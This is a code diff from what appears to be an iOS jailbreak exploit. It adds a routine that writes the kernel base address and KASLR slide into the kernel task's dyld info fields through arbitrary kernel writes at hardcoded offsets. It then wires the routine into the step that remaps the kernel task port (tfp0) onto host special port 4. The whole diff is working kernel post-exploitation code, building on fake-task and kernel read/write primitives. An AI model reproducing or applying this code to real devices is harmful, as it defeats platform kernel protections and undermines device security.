@@ -450,10 +450,42 @@ uint64_t make_fake_task(uint64_t vm_map) {
     return fake_task_kaddr;
 }
 
+bool save_kernel_base_to_tfp0(mach_port_t tfp0, uint64_t kernel_task_kaddr, uint64_t kernel_base, uint64_t kernel_slide)
+{
+    bool result = true;
+    // set dyld task info for kernel
+    // note: this offset is pretty much the t_flags offset +0x8
+    wk64(kernel_task_kaddr + 0x3a8, kernel_base);  // task->all_image_info_addr
+    wk64(kernel_task_kaddr + 0x3b0, kernel_slide); // task->all_image_info_size
+    
+    struct task_dyld_info dyld_info = {0};
+    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
+    kern_return_t ret = task_info(tfp0, TASK_DYLD_INFO, (task_info_t)&dyld_info, &count);
+    if (ret != KERN_SUCCESS) {
+        LOG("task_info ret: %x (%s)", ret, mach_error_string(ret));
+        result = false;
+    } else {
+        LOG("all_image_info_addr: %llx", dyld_info.all_image_info_addr);
+        LOG("all_image_info_size: %llx", dyld_info.all_image_info_size);
+        
+        if (dyld_info.all_image_info_addr != kernel_base)
+        {
+            LOG("failed to set all_image_info_addr godammit");
+            result = false;
+        }
+        
+        if (dyld_info.all_image_info_size != kernel_slide)
+        {
+            result = false;
+            LOG("failed to set all_image_info_size godammit");
+        }
+    }
+    return result;
+}
 // Stek29's code.
 
 kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
-int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref) {
+int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref, uint64_t kernel_base, uint64_t kernel_slide) {
     // huge thanks to Siguza for hsp4 & v0rtex
     // for explainations and being a good rubber duck :p
     
@@ -596,6 +628,7 @@ int remap_tfp0_set_hsp4(mach_port_t *port, uint64_t zone_map_ref) {
     uint64_t realhost_kaddr = ReadKernel64(host_priv_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
     WriteKernel64(realhost_kaddr + offsetof_host_special + 4 * sizeof(void*), port_kaddr);
     
+    save_kernel_base_to_tfp0(*port, kernel_task_kaddr, kernel_base, kernel_slide);
     return 0;
 }
 
@@ -1846,7 +1879,7 @@ void exploit(mach_port_t tfp0,
         
         LOG("Setting HSP4...");
         SETMESSAGE(NSLocalizedString(@"Failed to set HSP4.", nil));
-        _assert(remap_tfp0_set_hsp4(&tfp0, GETOFFSET(zone_map_ref)) == ERR_SUCCESS, message, true);
+        _assert(remap_tfp0_set_hsp4(&tfp0, GETOFFSET(zone_map_ref), kernel_base, kernel_slide) == ERR_SUCCESS, message, true);
         LOG("Successfully set HSP4.");
     }
     
